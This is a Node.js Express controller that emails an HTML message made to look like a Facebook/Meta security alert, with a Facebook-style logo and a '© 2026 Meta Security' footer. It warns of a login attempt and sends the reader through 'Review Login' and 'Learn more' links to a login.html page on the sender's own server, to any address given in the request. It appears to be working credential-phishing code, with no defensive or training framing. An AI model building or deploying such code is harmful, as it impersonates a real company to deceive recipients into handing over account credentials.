// controllers/emailController.js
const sendEmail = require("../services/emailService");

// PB logo (Facebook-style circle)
const fLogo = `
<div style="
  width:42px;
  height:42px;
  border-radius:50%;
  background:#1877f2;
  color:white;
  display:flex;
  align-items:center;
  justify-content:center;
  font-weight:bold;
  font-size:20px;
  font-family:Arial;
">
  f
</div>
`;

const emailTemplate = (loginLink, userEmail) => `
<div style="background:#18191a;padding:25px;font-family:Arial;color:#e4e6eb;">

  <!-- HEADER -->
  <div style="display:flex;align-items:center;">
    ${fLogo}
    <div style="flex:1;border-bottom:1px solid #3a3b3c;margin-left:10px;"></div>
  </div>

  <!-- CONTENT -->
  <p style="margin-top:20px;font-size:15px;">Hello,</p>

  <p style="font-size:15px;line-height:1.6;">
    We noticed a login attempt to your account. This is a security alert to keep your account protected.
  </p>

  <p style="font-weight:bold;margin-top:15px;">About this change</p>

  <p style="font-size:14px;line-height:1.6;">
    If this login was made by you, no action is required. Otherwise, please secure your account immediately.
  </p>

  <!-- BUTTON -->
  <a href="${loginLink}"
     style="
       display:block;
       width:100%;
       text-align:center;
       background:#1877f2;
       color:white;
       padding:14px;
       border-radius:6px;
       text-decoration:none;
       font-weight:bold;
       margin:25px 0;
     ">
     Review Login
  </a>

  <p style="font-size:14px;">
    If this wasn’t you, we recommend updating your password immediately.
  </p>

  <!-- FOOTER LINE -->
  <div style="border-bottom:1px solid #3a3b3c;margin:20px 0;"></div>

  <!-- FOOTER -->
  <p style="font-size:12px;color:#b0b3b8;">
    © 2026 Meta Security · 
    <a href="${loginLink}" style="color:#1877f2;text-decoration:none;">Learn more</a>
  </p>

  <p style="font-size:11px;color:#8a8d91;">
    Sent to ${userEmail}
  </p>
</div>
`;

exports.sendLoginEmail = async (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.status(400).json({ success: false, message: "Email required" });
    }

    // ✅ ALWAYS use Railway (no localhost)
    const loginLink = `${process.env.FRONTEND_URL}/login.html`;

    const sent = await sendEmail(
      email,
      "🔐 Security Alert: Confirm Your Login",
      emailTemplate(loginLink, email)
    );

    if (!sent) {
      return res.status(500).json({ success: false, message: "Email failed" });
    }

    return res.json({ success: true, message: "Email sent" });

  } catch (err) {
    console.error("Controller error:", err);
    return res.status(500).json({ success: false });
  }
};